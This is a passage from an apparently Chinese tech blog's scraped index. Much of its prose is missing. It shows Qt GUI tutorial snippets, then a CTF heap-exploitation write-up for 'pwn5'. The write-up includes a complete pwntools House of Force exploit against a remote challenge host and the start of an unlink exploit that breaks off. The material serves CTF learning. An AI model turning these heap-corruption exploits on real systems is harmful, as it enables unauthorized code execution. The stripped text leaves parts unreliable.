class=\"line\">\t\t\tbtn1-&gt;setText(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">&#125;();  <span class=\"comment\">//()</span></span><br><span class=\"line\"><span class=\"comment\">//[] </span></span><br><span class=\"line\"><span class=\"comment\">//()</span></span><br><span class=\"line\"><span class=\"comment\">//= </span></span><br><span class=\"line\"><span class=\"comment\">//&amp; </span></span><br><span class=\"line\"><span class=\"comment\">//a a</span></span><br><span class=\"line\"><span class=\"comment\">//&amp;a a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//mutable,</span></span><br><span class=\"line\">[=]()<span class=\"keyword\">mutable</span>&#123;m = <span class=\"number\">100</span> + <span class=\"number\">10</span>;</span><br><span class=\"line\">            qDebug &lt;&lt; m;&#125;();</span><br><span class=\"line\"><span class=\"comment\">// -&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> ret = []()-&gt;<span class=\"keyword\">int</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">1000</span>;&#125;();</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x04-QMainWindow\"><a href=\"#0x04-QMainWindow\" class=\"headerlink\" title=\"0x04 QMainWindow\"></a>0x04 QMainWindow</h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png\" alt=\"image-20201208225426943\"></p>\n<h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QMenuBar * bar = menuBar();</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">setMenuBar(bar);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QMenu * fileMenu = bar-&gt;addMenu(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">QMenu * editMenu = bar-&gt;addMenu(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//fileMenu-&gt;addAction(\"\");</span></span><br><span class=\"line\">QAction * action1 = fileMenu-&gt;addAction(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">fileMenu-&gt;addSeparator();</span><br><span class=\"line\">QAction * action2 = fileMenu-&gt;addAction(<span class=\"string\">\"\"</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">QToolBar * toolBar = <span class=\"keyword\">new</span> QToolBar(<span class=\"keyword\">this</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">toolBar-&gt;setFloatable(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">toolBar-&gt;setMovable(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//toolBar-&gt;addAction(\"\");</span></span><br><span class=\"line\">toolBar-&gt;addAction(action1);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">toolBar-&gt;addSeparator();</span><br><span class=\"line\">toolBar-&gt;addAction(action2);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QPushButton *btn = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QStatusBar * stBar = statusBar();</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">setStatusBar(stBar);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QLabel * label = <span class=\"keyword\">new</span> QLabel(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">stBar-&gt;addWidget(label);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QLabel * label1 = <span class=\"keyword\">new</span> QLabel(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//()</span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">QDockWidget * dock = <span class=\"keyword\">new</span> QDockWidget(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//()</span></span><br><span class=\"line\">QTextEdit * edit = <span class=\"keyword\">new</span> QTextEdit(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">setCentralWidget(edit);</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x05-\"><a href=\"#0x05-\" class=\"headerlink\" title=\"0x05 \"></a>0x05 </h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png\" alt=\"image-20201209001543539\"></p>\n<h2 id=\"0x06-\"><a href=\"#0x06-\" class=\"headerlink\" title=\"0x06 \"></a>0x06 </h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\">    <span class=\"built_in\">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class=\"line\">        <span class=\"comment\">// </span></span><br><span class=\"line\">        <span class=\"comment\">// </span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        QDialog dlg(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        dlg.resize(<span class=\"number\">200</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        dlg.exec();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        QDialog *dlg2 = <span class=\"keyword\">new</span> QDialog(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        dlg2-&gt;resize(<span class=\"number\">200</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">        dlg2-&gt;show();</span><br><span class=\"line\">        <span class=\"comment\">//</span></span><br><span class=\"line\">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//QMessageBox::critical(this,\"\",\"\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//QMessageBox::information(this,\"\",\"\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//1  2  3  4 </span></span><br><span class=\"line\">QMessageBox::question(<span class=\"keyword\">this</span>,<span class=\"string\">\"\"</span>,<span class=\"string\">\"\"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(QMessageBox::Save==QMessageBox::question(<span class=\"keyword\">this</span>,<span class=\"string\">\"\"</span>,<span class=\"string\">\"\"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//1  2  3  4 </span></span><br><span class=\"line\"><span class=\"comment\">//QString str = QFileDialog::getOpenFileName(this,\"\",\"c://\",\"(*.txt)\");</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\">QFontDialog::getFont(&amp;flag,QFont(<span class=\"string\">\"\"</span>,<span class=\"number\">36</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x07-\"><a href=\"#0x07-\" class=\"headerlink\" title=\"0x07 \"></a>0x07 </h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png\" alt=\"image-20201210092318304\"></p>\n<h2 id=\"0x08-\"><a href=\"#0x08-\" class=\"headerlink\" title=\"0x08 \"></a>0x08 </h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png\" alt=\"image-20201210100503686\"></p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class=\"string\">\"\"</span> &lt;&lt; <span class=\"string\">\"\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">QTreeWidgetItem * liitem =  <span class=\"keyword\">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">QTreeWidgetItem * spitem =  <span class=\"keyword\">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">QTreeWidgetItem * faitem =  <span class=\"keyword\">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class=\"line\">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class=\"line\">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-table\"><a href=\"#3-table\" class=\"headerlink\" title=\"3.table\"></a>3.table</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//table</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setColumnCount(<span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class=\"string\">\"\"</span> &lt;&lt;<span class=\"string\">\"\"</span> &lt;&lt; <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setRowCount(<span class=\"number\">5</span>);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setItem(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"keyword\">new</span> QTableWidgetItem(<span class=\"string\">\"\"</span>));</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    QList&lt;QString&gt; namelist;</span><br><span class=\"line\">    QStringList sexlist;</span><br><span class=\"line\">    sexlist &lt;&lt; <span class=\"string\">\"\"</span> &lt;&lt; <span class=\"string\">\"\"</span> &lt;&lt; <span class=\"string\">\"\"</span>  &lt;&lt; <span class=\"string\">\"\"</span></span><br><span class=\"line\">    namelist &lt;&lt; <span class=\"string\">\"ll\"</span> &lt;&lt; <span class=\"string\">\"aa\"</span> &lt;&lt; <span class=\"string\">\"11\"</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h3><p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png\" alt=\"image-20201210104641479\"></p>\n<h2 id=\"0x09-Qfile\"><a href=\"#0x09-Qfile\" class=\"headerlink\" title=\"0x09 Qfile\"></a>0x09 Qfile</h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png\" alt=\"image-20201214083900742\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png\" alt=\"image-20201214083912652\"></p>\n","categories":["Qt"],"tags":["Qt"]},{"title":"","url":"https://pz1o.top/2020/12/06//","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p></p>\n<p></p>\n<hr>\n<p> fw  </p>\n<p></p>\n<p></p>\n<p><a href=\"https://blog.csdn.net/qq_41453285/category_9150569.html\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_41453285/category_9150569.html</a></p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p>\n<h1 id=\"pwn5\"><a href=\"#pwn5\" class=\"headerlink\" title=\"pwn5\"></a>pwn5</h1><p>wp</p>\n<blockquote>\n<p>changehouse of force</p>\n<p>house of force</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>\n</blockquote>\n<p>house of force</p>\n<h2 id=\"house-of-force\"><a href=\"#house-of-force\" class=\"headerlink\" title=\"house of force\"></a><strong>house of force</strong></h2><p><strong></strong></p>\n<ul>\n<li> top chunk  size </li>\n<li></li>\n</ul>\n<p><strong></strong></p>\n<p>(1)</p>\n<p>(2)top chunksize</p>\n<p>(3)()top chunk</p>\n<p>(4)(FullRelro)got</p>\n<p>House Of Force  glibc  top chunk  top chunk </p>\n<p> top chunk  size  top chunk </p>\n<p> </p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png\" alt=\"image-20201213122054112\"></p>\n<p> </p>\n<p></p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png\" alt=\"image-20201213122653935\"></p>\n<p></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"aaaa\"</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png\" alt=\"image-20201213140931866\"></p>\n<p>top chunk</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"number\">0x30</span> * <span class=\"string\">'a'</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png\" alt=\"image-20201213170620443\"></p>\n<p> top</p>\n<p>0x40+0x200xftop0x8</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png\" alt=\"image-20201213175814153\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10014</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400D1B</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"ddaa\"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x30</span> * <span class=\"string\">'a'</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\">offset_to_heap_base = -(<span class=\"number\">0x40</span> + <span class=\"number\">0x20</span>)</span><br><span class=\"line\">malloc = offset_to_heap_base - <span class=\"number\">0x8</span> - <span class=\"number\">0xf</span></span><br><span class=\"line\">add(malloc,<span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(magic) * <span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>  </p>\n<h2 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h2><p></p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png\" alt=\"img\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\"><span class=\"meta\">#coding=utf-8</span></span><br><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">#context.log_level = 'debug'</span><br><span class=\"line\">p = process('./pwn5')</span><br><span class=\"line\">#p = remote('219.219.61.234','10014')</span><br><span class=\"line\">elf = ELF('./pwn5')</span><br><span class=\"line\"></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">def add(<span class=\"built_in\">size</span>,con):</span><br><span class=\"line\">\tp.sendlineafter('Your choice:','2')</span><br><span class=\"line\">\tp.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class=\"line\">\tp.sendafter('Plz 